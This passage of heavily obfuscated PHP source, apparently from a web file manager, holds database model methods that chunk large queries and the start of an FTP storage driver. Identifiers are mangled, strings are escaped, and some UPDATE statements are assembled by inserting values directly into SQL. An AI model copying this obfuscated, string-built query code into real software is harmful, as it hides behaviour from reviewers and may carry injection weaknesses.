$œó¦ÊçÚ = $‚£Áø®›[1]; $Å½š¶­ = isset($‚£Áø®›[4]) ? (array) $‚£Áø®›[4] : array(); if ($œó¦ÊçÚ == $Åó’¤¬ğ[216] && array_key_exists($•İ™²ë, $›Ã–ú¬)) { if (!$›Ã–ú¬[$•İ™²ë]) { unset($›Ã–ú¬[$•İ™²ë]); } break; } if (isset($›Ã–ú¬[$•İ™²ë])) { array_unshift($Å½š¶­, $›Ã–ú¬[$•İ™²ë]); } if ($Åó’¤¬ğ[390] == $‚£Áø®›[3]) { $›Ã–ú¬[$•İ™²ë] = call_user_func_array($œó¦ÊçÚ, $Å½š¶­); } else { $›Ã–ú¬[$•İ™²ë] = call_user_func_array(array(&$this, $œó¦ÊçÚ), $Å½š¶­); } break; case $Åó’¤¬ğ[340]: if (isset($›Ã–ú¬[$•İ™²ë]) && $›Ã–ú¬[$•İ™²ë]) { $›Ã–ú¬[$•İ™²ë] = call_user_func_array(array(&$this, $‚£Áø®›[1]), array($›Ã–ú¬[$•İ™²ë])); } break; case $Åó’¤¬ğ[343]: $›Ã–ú¬[$•İ™²ë] = $›Ã–ú¬[$‚£Áø®›[1]]; break; case $Åó’¤¬ğ[363]: if (isset($›Ã–ú¬[$•İ™²ë]) && !is_string($›Ã–ú¬[$•İ™²ë])) { $›Ã–ú¬[$•İ™²ë] = json_encode_force($›Ã–ú¬[$•İ™²ë]); } break; case $Åó’¤¬ğ[392]: if ($›Ã–ú¬[$•İ™²ë] === $Åó’¤¬ğ[12]) { unset($›Ã–ú¬[$•İ™²ë]); } break; case $Åó’¤¬ğ[393]: $›Ã–ú¬[$•İ™²ë] = $‚£Áø®›[1]; default: break; } } if ($—×ÛğÄè == $Åó’¤¬ğ[424]) { $¡ñô ‹‹ = strtolower($this->db->getDbType()); if (strpos($¡ñô ‹‹, $Åó’¤¬ğ[13]) !== 0) { return; } $×ÒüÔ—à = $this->field(!0)->fields; $æšßå£‚ = $×ÒüÔ—à[$Åó’¤¬ğ[322]]; if (isset($×ÒüÔ—à[$Åó’¤¬ğ[321]])) { unset($æšßå£‚[$×ÒüÔ—à[$Åó’¤¬ğ[321]]]); } foreach ($æšßå£‚ as $‹¾àŞ½ => $—×ÛğÄè) { if (!isset($›Ã–ú¬[$‹¾àŞ½])) { $›Ã–ú¬[$‹¾àŞ½] = $Åó’¤¬ğ[12]; } } } } private function dataAfterFilter(&$â¢ıÓÁ¤) { $ùıÊ»ó‘ =& $_SERVER[è¶³ÒßÑ]; foreach ($this->dataAuto as $¾ÂŒô•) { $úÑšºÔ = $¾ÂŒô•[0]; if (!isset($â¢ıÓÁ¤[$úÑšºÔ])) { continue; } if (!in_array($ùıÊ»ó‘[426], explode($ùıÊ»ó‘[50], $¾ÂŒô•[2]))) { continue; } switch (trim($¾ÂŒô•[3])) { case $ùıÊ»ó‘[390]: case $ùıÊ»ó‘[391]: $²éÙÇ™¦ = isset($¾ÂŒô•[4]) ? (array) $¾ÂŒô•[4] : array(); array_unshift($²éÙÇ™¦, $â¢ıÓÁ¤[$úÑšºÔ]); if (isset($¾ÂŒô•[4]) && $¾ÂŒô•[4] == $ùıÊ»ó‘[446]) { $²éÙÇ™¦ = array($â¢ıÓÁ¤[$úÑšºÔ]); } if ($ùıÊ»ó‘[390] == $¾ÂŒô•[3]) { $â¢ıÓÁ¤[$úÑšºÔ] = call_user_func_array($¾ÂŒô•[1], $²éÙÇ™¦); } else { $â¢ıÓÁ¤[$úÑšºÔ] = call_user_func_array(array(&$this, $¾ÂŒô•[1]), $²éÙÇ™¦); } break; case $ùıÊ»ó‘[340]: if (isset($â¢ıÓÁ¤[$úÑšºÔ]) && $â¢ıÓÁ¤[$úÑšºÔ]) { $â¢ıÓÁ¤[$úÑšºÔ] = call_user_func_array(array(&$this, $¾ÂŒô•[1]), array($â¢ıÓÁ¤[$úÑšºÔ])); } break; case $ùıÊ»ó‘[343]: $â¢ıÓÁ¤[$úÑšºÔ] = $â¢ıÓÁ¤[$¾ÂŒô•[1]]; break; case $ùıÊ»ó‘[363]: $àÍ²£Áµ = $â¢ıÓÁ¤[$úÑšºÔ]; $â¢ıÓÁ¤[$úÑšºÔ] = json_decode($àÍ²£Áµ, !0); if (is_null($â¢ıÓÁ¤[$úÑšºÔ])) { $â¢ıÓÁ¤[$úÑšºÔ] = $àÍ²£Áµ; } break; case $ùıÊ»ó‘[392]: if ($â¢ıÓÁ¤[$úÑšºÔ] === $ùıÊ»ó‘[12]) { unset($â¢ıÓÁ¤[$úÑšºÔ]); } break; case $ùıÊ»ó‘[393]: $â¢ıÓÁ¤[$úÑšºÔ] = $¾ÂŒô•[1]; break; default: break; } } } public function saveAll($­Ô¹ÛÖ¦) { $ÏÑ¢ÙïŞ =& $_SERVER[è¶³ÒßÑ]; $¿Ñ¢Œ÷ƒ = $this->tablePrefix . $this->tableName; $ö³íËÃ = self::SQL_WHERE_IN_CHUNK; $­Ô¹ÛÖ¦ = is_array($­Ô¹ÛÖ¦) ? $­Ô¹ÛÖ¦ : array(); $¥šòÜ­° = $ÏÑ¢ÙïŞ[447]; $ŸÀù¡ = 0; $—­¦—Ø = array(); $–­ÈÈ»Œ = count($­Ô¹ÛÖ¦); for ($üåáÀŠì = 0; $üåáÀŠì < $–­ÈÈ»Œ; $üåáÀŠì++) { $ØŸäÖºÚ = $­Ô¹ÛÖ¦[$üåáÀŠì]; if (!is_array($ØŸäÖºÚ) || count($ØŸäÖºÚ) != 4) { continue; } $¡ÆÃ‡”å = "\125\x50\104\101\124\105\x20\x60{$¿Ñ¢Œ÷ƒ}\x60\x20\x53\105\x54\40{$ØŸäÖºÚ[2]}\40\x3d\40\x43\x41\123\x45\40{$ØŸäÖºÚ[0]}\40\xa"; if ($ŸÀù¡ == 0) { $¥šòÜ­° = $¡ÆÃ‡”å; } $—­¦—Ø[] = $ÏÑ¢ÙïŞ[131] . $ØŸäÖºÚ[1] . $ÏÑ¢ÙïŞ[131]; $ŸÀù¡++; $¥šòÜ­° .= "\x20\127\110\x45\116\40\x27{$ØŸäÖºÚ[1]}\47\x20\124\x48\x45\116\x20\x27{$ØŸäÖºÚ[3]}\x27\x20\xa"; if ($ŸÀù¡ == $ö³íËÃ || $üåáÀŠì == $–­ÈÈ»Œ - 1) { $…¢ë¡ş¥ = implode($ÏÑ¢ÙïŞ[50], $—­¦—Ø); $¥šòÜ­° .= "\40\x45\116\x44\x20\x20\127\x48\105\x52\105\40{$ØŸäÖºÚ[0]}\x20\x49\116\40\x28{$…¢ë¡ş¥}\x29\40"; $this->execute($¥šòÜ­°); $ŸÀù¡ = 0; $¥šòÜ­° = $¡ÆÃ‡”å; $this->chunkEventCheck(count($—­¦—Ø)); $—­¦—Ø = array(); } } $this->chunkEventSet(); } public function saveAllEach($É÷ªòÍ¦) { $Ş„ñÍÄ =& $_SERVER[è¶³ÒßÑ]; $ëØ™²…Ş = $this->tablePrefix . $this->tableName; foreach ($É÷ªòÍ¦ as $°ş—“Ú) { if (!is_array($°ş—“Ú) || count($°ş—“Ú) != 4) { continue; } $ğ‚Õ¯ÎÉ = $°ş—“Ú[0] . $Ş„ñÍÄ[448] . $°ş—“Ú[1] . $Ş„ñÍÄ[131]; $–èÎó¦· = $°ş—“Ú[2] . $Ş„ñÍÄ[448] . $°ş—“Ú[3] . $Ş„ñÍÄ[131]; $¡©ˆŸ×÷ = "\165\160\144\x61\164\x65\x20{$ëØ™²…Ş}\40\x73\x65\x74\40{$–èÎó¦·}\x20\167\x68\x65\162\x65\40{$ğ‚Õ¯ÎÉ}\x3b"; $this->execute($¡©ˆŸ×÷); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($œ¨óô õ = false, $Â€˜²¬ß = false) { $this->_chunkEvent = $œ¨óô õ; $this->_chunkEventParam = $Â€˜²¬ß; } private function chunkEventCheck($÷æ¿Ö¼®) { if (!$this->_chunkEvent) { return; } $æïàøí© = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $æïàøí©[$_SERVER[è¶³ÒßÑ][449]] = $÷æ¿Ö¼®; Hook::trigger($this->_chunkEvent, $æïàøí©); } public function addAll($ŠÎÅ˜ª, $×óëÅ°ô = array(), $“æƒ…Û× = false) { $İúÌ¤‡ =& $_SERVER[è¶³ÒßÑ]; ignore_timeout(); $îËŠÅšş = self::SQL_WHERE_IN_CHUNK; if (empty($ŠÎÅ˜ª)) { $this->error = think_lang($İúÌ¤‡[341]); return !1; } $×óëÅ°ô = $this->_parseOptions($×óëÅ°ô); foreach ($ŠÎÅ˜ª as $Ù¬¼Ï™î => $Îªœ¶‹) { $ŠÎÅ˜ª[$Ù¬¼Ï™î] = $this->_facade($Îªœ¶‹); $this->_beforeInsert($ŠÎÅ˜ª[$Ù¬¼Ï™î], $×óëÅ°ô); } if (method_exists($this->db, $İúÌ¤‡[342])) { for ($¬¯ğúÇƒ = 0; $¬¯ğúÇƒ < count($ŠÎÅ˜ª); $¬¯ğúÇƒ += $îËŠÅšş) { $Ã¨±’øÍ = array_slice($ŠÎÅ˜ª, $¬¯ğúÇƒ, $îËŠÅšş); if (!is_array($Ã¨±’øÍ) || count($Ã¨±’øÍ) == 0) { break; } $¿Û§ˆïƒ = $this->db->insertAll($Ã¨±’øÍ, $×óëÅ°ô, $“æƒ…Û×); $this->chunkEventCheck(count($Ã¨±’øÍ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ŠÎÅ˜ª as $Ù¬¼Ï™î => $Îªœ¶‹) { $¿Û§ˆïƒ = $this->db->insert($Îªœ¶‹, $×óëÅ°ô, $“æƒ…Û×); } $this->commit(); } if (!1 !== $¿Û§ˆïƒ) { $áó“¤Ë = $this->getLastInsID(); if ($áó“¤Ë) { return $áó“¤Ë; } } return $¿Û§ˆïƒ; } public function save($Ëîù¥¿’ = '', $…¸¥ıÛ = array()) { $º“­›¤ş =& $_SERVER[è¶³ÒßÑ]; $¬ª­ô = self::SQL_WHERE_IN_CHUNK; $³é©ÌÁ° = $this->optionsValue(); $º«²ÈùË = $this->findWhereField($³é©ÌÁ°); if (!$º«²ÈùË) { return parent::save($Ëîù¥¿’, $…¸¥ıÛ); } $Ç´ç½ş¶ = 0; $ŞÅÏûª = $³é©ÌÁ°[$º“­›¤ş[345]][$º«²ÈùË][1]; $ŞÅÏûª = is_array($ŞÅÏûª) ? $ŞÅÏûª : array(); $”ÉŞğ¾ = count($ŞÅÏûª); for ($ßºüÑéå = 0; $ßºüÑéå < $”ÉŞğ¾; $ßºüÑéå += $¬ª­ô) { $ß‘Ğä‰ = array_slice($ŞÅÏûª, $ßºüÑéå, $¬ª­ô); if (!is_array($ß‘Ğä‰) || count($ß‘Ğä‰) == 0) { break; } $³é©ÌÁ°[$º“­›¤ş[345]][$º«²ÈùË][1] = $ß‘Ğä‰; $this->optionsValue($³é©ÌÁ°); $Ç´ç½ş¶ += parent::save($Ëîù¥¿’, $…¸¥ıÛ); $this->chunkEventCheck(count($ß‘Ğä‰)); } $this->chunkEventSet(); return $Ç´ç½ş¶; } public function add($š²§òµŞ = '', $ÛÕÉå¾ò = array(), $¿Ü¾ƒˆ£ = false) { if ($this->addTaskStatus && is_array($š²§òµŞ)) { $this->addTaskData[] = $š²§òµŞ; return; } return parent::add($š²§òµŞ, $ÛÕÉå¾ò, $¿Ü¾ƒˆ£); } public function parseWhereLike($èóŞÔè¯, $ŠğÖÉ÷ç = '', $÷ïºé“ = false, &$Ê£Ôê­ë = false) { $ıû‚Ú‘ê =& $_SERVER[è¶³ÒßÑ]; $“©ŞıÈø = $GLOBALS[$ıû‚Ú‘ê[6]][$ıû‚Ú‘ê[450]]; if (!$“©ŞıÈø[$ıû‚Ú‘ê[451]]) { return $èóŞÔè¯; } if (!is_array($èóŞÔè¯)) { return $èóŞÔè¯; } $š¦û©ğ¿ = array(); $ºÛ˜©ÏÓ = 0; foreach ($èóŞÔè¯ as $­ãÏİĞÆ => $¿Âğ¸šç) { if (is_array($¿Âğ¸šç) && count($¿Âğ¸šç) == 2 && $¿Âğ¸šç[0] == $ıû‚Ú‘ê[452] && is_string($¿Âğ¸šç[1]) && substr($¿Âğ¸šç[1], 0, 1) == $ıû‚Ú‘ê[453] && substr($¿Âğ¸šç[1], strlen($¿Âğ¸šç[1]) - 1, 1) == $ıû‚Ú‘ê[453]) { $Ê£Ôê­ë = !0; $€Áè©¦ = is_string($­ãÏİĞÆ) ? $­ãÏİĞÆ : $ŠğÖÉ÷ç; $ÒğÜ¹şÌ = substr($¿Âğ¸šç[1], 1, strlen($¿Âğ¸šç[1]) - 2); $ÒğÜ¹şÌ = $this->db->escapeString($ÒğÜ¹şÌ); if (!strpos($€Áè©¦, $ıû‚Ú‘ê[10])) { $€Áè©¦ = $ıû‚Ú‘ê[454] . $€Áè©¦ . $ıû‚Ú‘ê[454]; } $Œƒ»”Õº = $ıû‚Ú‘ê[230] . $ÒğÜ¹şÌ . $ıû‚Ú‘ê[230]; $ÒğÜ¹şÌ = str_replace(array($ıû‚Ú‘ê[10], $ıû‚Ú‘ê[455], $ıû‚Ú‘ê[11]), $ıû‚Ú‘ê[456], $ÒğÜ¹şÌ); if ($“©ŞıÈø[$ıû‚Ú‘ê[457]]) { $Œƒ»”Õº = $ıû‚Ú‘ê[458] . $ÒğÜ¹şÌ . $ıû‚Ú‘ê[459]; if ($“©ŞıÈø[$ıû‚Ú‘ê[460]]) { $Œƒ»”Õº = $ıû‚Ú‘ê[459] . $ÒğÜ¹şÌ . $ıû‚Ú‘ê[458]; } } $š¦û©ğ¿[$ºÛ˜©ÏÓ] = $ıû‚Ú‘ê[461] . $€Áè©¦ . $ıû‚Ú‘ê[462] . $Œƒ»”Õº . $ıû‚Ú‘ê[463]; $ºÛ˜©ÏÓ++; continue; } if (is_array($¿Âğ¸šç)) { $ŠğÖÉ÷ç = is_string($­ãÏİĞÆ) ? $­ãÏİĞÆ : $ŠğÖÉ÷ç; $¿Âğ¸šç = $this->parseWhereLike($¿Âğ¸šç, $ŠğÖÉ÷ç, !0, $Ê£Ôê­ë); } if (is_numeric($­ãÏİĞÆ)) { $š¦û©ğ¿[$ºÛ˜©ÏÓ] = $¿Âğ¸šç; $ºÛ˜©ÏÓ++; } else { $š¦û©ğ¿[$­ãÏİĞÆ] = $¿Âğ¸šç; } } if ($Ê£Ôê­ë && !$÷ïºé“) { } return $š¦û©ğ¿; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($†Ò¾ÏŞ = array()) { $ç»¥¡×™ =& $_SERVER[è¶³ÒßÑ]; $¸ ¡Âèá = self::SQL_WHERE_IN_CHUNK; $‹ëéÑ”á = $this->optionsValue(); $œ¬êæóá = $this->findWhereField($‹ëéÑ”á); if (!$œ¬êæóá || isset($‹ëéÑ”á[$ç»¥¡×™[361]]) || isset($‹ëéÑ”á[$ç»¥¡×™[422]])) { return parent::select($†Ò¾ÏŞ); } $»æî¾Â© = $‹ëéÑ”á[$ç»¥¡×™[345]][$œ¬êæóá][1]; $»æî¾Â© = is_array($»æî¾Â©) ? $»æî¾Â© : array(); $ëøÛáŒÄ = null; for ($¸î¨Œ = 0; $¸î¨Œ < count($»æî¾Â©); $¸î¨Œ += $¸ ¡Âèá) { $™ŠŒ˜ÌĞ = array_slice($»æî¾Â©, $¸î¨Œ, $¸ ¡Âèá); if (!is_array($™ŠŒ˜ÌĞ) || count($™ŠŒ˜ÌĞ) == 0) { break; } $‹ëéÑ”á[$ç»¥¡×™[345]][$œ¬êæóá][1] = $™ŠŒ˜ÌĞ; $this->optionsValue($‹ëéÑ”á); $¨„Ø‡¢© = parent::select($†Ò¾ÏŞ); if (!$¨„Ø‡¢©) { continue; } $ëøÛáŒÄ = is_array($ëøÛáŒÄ) ? $ëøÛáŒÄ : array(); $ëøÛáŒÄ = array_merge($ëøÛáŒÄ, $¨„Ø‡¢©); } return $ëøÛáŒÄ; } public function delete($®­Æ³‡ê = array()) { $Äàè·ãÃ =& $_SERVER[è¶³ÒßÑ]; $†¿äÚ­Ù = self::SQL_WHERE_IN_CHUNK; $Ø´­Á—Ù = $this->optionsValue(); $ŒÅøÕ©ñ = $this->findWhereField($Ø´­Á—Ù); if (!$ŒÅøÕ©ñ) { return parent::delete($®­Æ³‡ê); } $’ä¯ÙâÒ = 0; $òÔ…íİğ = $Ø´­Á—Ù[$Äàè·ãÃ[345]][$ŒÅøÕ©ñ][1]; $òÔ…íİğ = is_array($òÔ…íİğ) ? $òÔ…íİğ : array(); for ($Çº°ê€¨ = 0; $Çº°ê€¨ < count($òÔ…íİğ); $Çº°ê€¨ += $†¿äÚ­Ù) { $ÆÀÜÈ€æ = array_slice($òÔ…íİğ, $Çº°ê€¨, $†¿äÚ­Ù); if (!is_array($ÆÀÜÈ€æ) || count($ÆÀÜÈ€æ) == 0) { break; } $Ø´­Á—Ù[$Äàè·ãÃ[345]][$ŒÅøÕ©ñ][1] = $ÆÀÜÈ€æ; $this->optionsValue($Ø´­Á—Ù); $’ä¯ÙâÒ += parent::delete($®­Æ³‡ê); } return $’ä¯ÙâÒ; } private function findWhereField($ÌÂï£ß“) { $™å¡„¿Š =& $_SERVER[è¶³ÒßÑ]; $Êç’ûœß = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÌÂï£ß“) || !is_array($ÌÂï£ß“[$™å¡„¿Š[345]])) { return !1; } foreach ($ÌÂï£ß“[$™å¡„¿Š[345]] as $è–º°õ => $üİ¨ùàõ) { if (is_array($üİ¨ùàõ) && isset($üİ¨ùàõ[0]) && is_string($üİ¨ùàõ[0]) && strtolower($üİ¨ùàõ[0]) == $™å¡„¿Š[7] && is_array($üİ¨ùàõ[1]) && count($üİ¨ùàõ[1]) > $Êç’ûœß) { ignore_timeout(); return $è–º°õ; } } return !1; } public function setMasterDB($ƒèõ¹§ê = true) { think_config($_SERVER[è¶³ÒßÑ][464], $ƒèõ¹§ê); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\117\x70\x74\151\157\156"; public $field = array(); public function listData($š®›¬¯ = false, $›ìùí¶ = "\155\x6f\144\151\146\x79\x54\151\x6d\x65", $½ãè„½ = false) { $ˆ×Øîğ = Model($this->modelType)->get(!1, $this->optionType, !0); $ºŞİùîÔ = array_values($ˆ×Øîğ); if ($ºŞİùîÔ && $ºŞİùîÔ[0] && !is_array($ºŞİùîÔ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ˆ×Øîğ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ˆ×Øîğ) { return $š®›¬¯ ? null : array(); } if (!$š®›¬¯) { $ˆ×Øîğ = array_filter(array_values($ˆ×Øîğ)); return array_sort_by($ˆ×Øîğ, $›ìùí¶, $½ãè„½); } return $ˆ×Øîğ[$_SERVER[è¶³ÒßÑ][465] . $š®›¬¯]; } public function insert($‚ «ö¸) { $ô‚¼ˆÎ­ =& $_SERVER[è¶³ÒßÑ]; $‚ «ö¸ = array_field_key($‚ «ö¸, $this->field); $Ùµ‚Íä‚ = Model($this->modelType)->get($ô‚¼ˆÎ­[466], $this->optionType . $ô‚¼ˆÎ­[467]); $Ùµ‚Íä‚ = $Ùµ‚Íä‚ ? $Ùµ‚Íä‚ : 0; $‚ «ö¸[$ô‚¼ˆÎ­[468]] = ++$Ùµ‚Íä‚; $‚ «ö¸[$ô‚¼ˆÎ­[241]] = time(); $‚ «ö¸[$ô‚¼ˆÎ­[98]] = time(); Model($this->modelType)->set($ô‚¼ˆÎ­[466], $Ùµ‚Íä‚, $this->optionType . $ô‚¼ˆÎ­[467]); Model($this->modelType)->set($ô‚¼ˆÎ­[465] . $Ùµ‚Íä‚, $‚ «ö¸, $this->optionType); return $Ùµ‚Íä‚; } public function update($ëÑ¾İÇ², $â’ÏÒ•¤) { $Ÿû—ŒÍà =& $_SERVER[è¶³ÒßÑ]; $â’ÏÒ•¤ = array_field_key($â’ÏÒ•¤, $this->field); $„ø‡˜„¬ = $this->listData($ëÑ¾İÇ²); if (!$„ø‡˜„¬ || !$ëÑ¾İÇ²) { return !1; } $â’ÏÒ•¤ = array_merge($„ø‡˜„¬, $â’ÏÒ•¤); $â’ÏÒ•¤[$Ÿû—ŒÍà[98]] = time(); return Model($this->modelType)->set($Ÿû—ŒÍà[465] . $ëÑ¾İÇ², $â’ÏÒ•¤, $this->optionType); } public function remove($·ú“ü¡õ) { if (!$·ú“ü¡õ) { return !1; } return Model($this->modelType)->remove($_SERVER[è¶³ÒßÑ][465] . $·ú“ü¡õ, $this->optionType); } public function clear() { $ŸÛÃ‡”Ñ =& $_SERVER[è¶³ÒßÑ]; Model($this->modelType)->remove($ŸÛÃ‡”Ñ[466], $this->optionType . $ŸÛÃ‡”Ñ[467]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÚÂéÍÄ½, $úÂö¦¢™) { if (!$úÂö¦¢™) { return !1; } $ĞÇ¼ôé¦ = $this->listData(); $ĞÇ¼ôé¦ = array_to_keyvalue($ĞÇ¼ôé¦, $ÚÂéÍÄ½); return isset($ĞÇ¼ôé¦[$úÂö¦¢™]) ? $ĞÇ¼ôé¦[$úÂö¦¢™] : !1; } public function findByName($Öª¹Ÿú) { return $this->findByKey($_SERVER[è¶³ÒßÑ][32], $Öª¹Ÿú); } protected function resetData($´¶Ù½) { $Œ™Ìêô¸ =& $_SERVER[è¶³ÒßÑ]; $´¶Ù½ = is_array($´¶Ù½) ? $´¶Ù½ : array(); $ğ›„Ò½¤ = array(); for ($©‚ÜŒ±Å = 0; $©‚ÜŒ±Å < count($´¶Ù½); $©‚ÜŒ±Å++) { $ğ›„Ò½¤[$Œ™Ìêô¸[465] . $´¶Ù½[$©‚ÜŒ±Å][$Œ™Ìêô¸[468]]] = $´¶Ù½[$©‚ÜŒ±Å]; } return Model($this->modelType)->set($ğ›„Ò½¤, !1, $this->optionType); } private function getAutoName($ì¦Íı÷ò) { $¾ä×ìÖ› = array_to_keyvalue($this->listData(), $_SERVER[è¶³ÒßÑ][32]); if (!$¾ä×ìÖ› || !isset($¾ä×ìÖ›[$ì¦Íı÷ò])) { return $ì¦Íı÷ò; } for ($¯§È½”œ = 1; $¯§È½”œ < count($¾ä×ìÖ›); $¯§È½”œ++) { $ŠÙ°À¨ù = $ì¦Íı÷ò . "\x28{$¯§È½”œ}\51"; if (!isset($¾ä×ìÖ›[$ŠÙ°À¨ù])) { return $ŠÙ°À¨ù; } } return $ŠÙ°À¨ù; } } goto aÑá¶ù­òİ; Aí‡öÈ·¨Ÿ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($Å¶šÃ¹«) { parent::__construct(); if (count($Å¶šÃ¹«) > 0) { $this->_init($Å¶šÃ¹«); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¬ïşâéİ) { $¬ùû‘İ =& $_SERVER[è¶³ÒßÑ]; global $config; $this->appCharset = $config[$¬ùû‘İ[1413]]; $this->systemCharset = $config[$¬ùû‘İ[1414]]; if (isset($¬ïşâéİ[$¬ùû‘İ[1415]]) && $¬ïşâéİ[$¬ùû‘İ[1415]]) { $this->systemCharset = $¬ïşâéİ[$¬ùû‘İ[1415]]; } } public function iconvApp($Ğ‚ÀË‚²) { return $this->iconvTo($Ğ‚ÀË‚², $this->systemCharset, $this->appCharset); } public function iconvSystem($¹ĞĞé…æ) { return $this->iconvTo($¹ĞĞé…æ, $this->appCharset, $this->systemCharset); } public function getPathOuter($±ñ½µ¸ñ) { $®–¸Âêµ =& $_SERVER[è¶³ÒßÑ]; $èŒ¥Ï„ = $this->iconvApp($this->pathBase); $±ñ½µ¸ñ = $this->iconvApp($±ñ½µ¸ñ); if (substr($èŒ¥Ï„, 0, 2) == $®–¸Âêµ[1416]) { $èŒ¥Ï„ = BASIC_PATH . substr($èŒ¥Ï„, 2); } if (substr($±ñ½µ¸ñ, 0, 2) == $®–¸Âêµ[1416]) { $±ñ½µ¸ñ = BASIC_PATH . substr($±ñ½µ¸ñ, 2); } $èŒ¥Ï„ = KodIO::clear($èŒ¥Ï„); $±ñ½µ¸ñ = KodIO::clear($±ñ½µ¸ñ); $±ñ½µ¸ñ = substr($±ñ½µ¸ñ, strlen($èŒ¥Ï„)); if (empty($this->pathDriver)) { return $±ñ½µ¸ñ; } return $this->pathDriver . $®–¸Âêµ[8] . ltrim($±ñ½µ¸ñ, $®–¸Âêµ[8]); } private function _init($³ÚéÌéÁ = array()) { $‘ßÎßÄê =& $_SERVER[è¶³ÒßÑ]; if (!function_exists($‘ßÎßÄê[1417])) { throw new Exception(LNG($‘ßÎßÄê[1418])); } $this->config = $³ÚéÌéÁ; $this->charsetReset($³ÚéÌéÁ); foreach ($³ÚéÌéÁ as $è§”Ó‘ú => $­ÀÇìõ‰) { if (isset($this->{$è§”Ó‘ú})) { $this->{$è§”Ó‘ú} = $­ÀÇìõ‰; } } return $this->_login($³ÚéÌéÁ); } private function _login($ˆÙÕäÎÙ) { $¹¾ £‘ =& $_SERVER[è¶³ÒßÑ]; static $Ö­Ú¦Õô = array(); $ÕîíëÙ˜ = md5(json_encode($ˆÙÕäÎÙ)); if (isset($Ö­Ú¦Õô[$ÕîíëÙ˜])) { foreach ($Ö­Ú¦Õô[$ÕîíëÙ˜] as $¡ãÀ‚Œ => $äÙö¾«ª) { $this->{$¡ãÀ‚Œ} = $äÙö¾«ª; } return !0; } $îæÁÃ ş = parse_url(trim($this->server, $¹¾ £‘[8])); $this->host = $îæÁÃ ş[$¹¾ £‘[218]]; $Êü÷ø†Î = isset($îæÁÃ ş[$¹¾ £‘[217]]) && $îæÁÃ ş[$¹¾ £‘[217]] == $¹¾ £‘[1419] ? !0 : !1; $this->scheme = $Êü÷ø†Î ? $¹¾ £‘[1420] : $¹¾ £‘[1421]; $this->port = isset($îæÁÃ ş[$¹¾ £‘[219]]) ? $îæÁÃ ş[$¹¾ £‘[219]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¹¾ £‘[1422]) . $this->host . $¹¾ £‘[4] . $this->port, !0); return !1; } $æ»°ääî = @ftp_login($this->connect, $this->username, $this->userpass); if (!$æ»°ääî) { $this->writeLog(LNG($¹¾ £‘[1423]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $µë«²‹ = $this->pasv == $¹¾ £‘[101] ? !0 : !1; @ftp_pasv($this->connect, $µë«²‹); $Ö­Ú¦Õô[$ÕîíëÙ˜] = array($¹¾ £‘[1424] => $this->connect, $¹¾ £‘[218] => $this->host, $¹¾ £‘[217] => $this->scheme, $¹¾ £‘[219] => $this->port); return $æ»°ääî; } private function _isconn($õë‰ø™ˆ = true) { if (is_resource($this->connect)) { return !0; } if (!$õë‰ø™ˆ) { return !1; } return $this->_login($this->config); } public function mkfile($‡ı•¡è§, $ôŠï¡¥ = '', $ä¼™ÌÁ™ = REPEAT_RENAME) { if ($this->setContent($‡ı•¡è§, $ôŠï¡¥)) { return $this->getPathOuter($‡ı•¡è§); } $this->writeLog(LNG($_SERVER[è¶³ÒßÑ][1425]), !0); return !1; } public function mkdir($Â›ÙµÅ, $Ê‡³ê‹ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Â›ÙµÅ = $this->iconvSystem($Â›ÙµÅ); if ($this->_isFolder($Â›ÙµÅ) || @ftp_mkdir($this->connect, $Â›ÙµÅ)) { return $this->getPathOuter($Â›ÙµÅ); } if (!$this->mkdir($this->pathFather($Â›ÙµÅ))) { return !1; } if ($Â›ÙµÅ = @ftp_mkdir($this->connect, $Â›ÙµÅ)) { return $this->getPathOuter($Â›ÙµÅ); } $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } public function copyFile($ªˆïõÆ½, $ÄóçÃ) { if (!$this->_isconn()) { return !1; } $Ìªœº»™ = $this->pathThis($this->iconvSystem($ªˆïõÆ½)); $³âğîŸ = $this->tempFile($Ìªœº»™); $ïº½Ë÷ = $this->iconvApp($³âğîŸ); $this->download($ªˆïõÆ½, $ïº½Ë÷); $—ê¤®Ò = $this->upload($ÄóçÃ, $ïº½Ë÷); $this->tempFileRemve($³âğîŸ); return $—ê¤®Ò; } public function moveFile($÷Ùë–ü, $ç¥è©ºÄ) { if (!$this->_isconn()) { return !1; } $÷Ùë–ü = $this->iconvSystem($÷Ùë–ü); $ç¥è©ºÄ = $this->iconvSystem($ç¥è©ºÄ); $Ñ´µ¼¼Œ = @ftp_rename($this->connect, $÷Ùë–ü, $ç¥è©ºÄ); if (!$Ñ´µ¼¼Œ) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); return !1; } return $this->getPathOuter($ç¥è©ºÄ); } public function delFile($üâÔ†¬µ) { if (!$this->_isconn()) { return !1; } $üâÔ†¬µ = $this->iconvSystem($üâÔ†¬µ); $¥ÀÓê•ƒ = @ftp_delete($this->connect, $üâÔ†¬µ); if (!$¥ÀÓê•ƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][1426], !0); } return $¥ÀÓê•ƒ; } public function delFolder($ºá–ôßÀ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $…óõ¥ı = $üÄÒ°¨µ = array(); $this->fileList($ºá–ôßÀ, $…óõ¥ı, 